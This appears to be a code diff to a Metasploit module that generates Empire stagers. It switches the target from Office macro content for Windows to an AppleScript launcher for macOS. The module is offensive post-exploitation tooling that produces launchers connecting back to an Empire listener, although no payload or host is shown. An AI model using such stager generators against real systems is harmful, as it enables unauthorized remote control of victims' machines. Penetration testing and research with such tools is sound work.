@@ -10,12 +10,12 @@ module MetasploitModule
 
   def initialize(info={})
     super(merge_info(info,
-    'Description'=> 'Creates the Macro Content for Microsoft Office Documents for Empire'
+    'Description'=> 'Generates ApplScript to execute the Empire stage0 laucher'
     ))
   end
 
-  def stager_generator(empireClient)
-    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/macro')
+  def stagerGenerator(empireClient)
+    @stagerCode = empireClient.gen_stager(@listener_name, 'osx/applescript')
     return @stagerCode
   end
 end
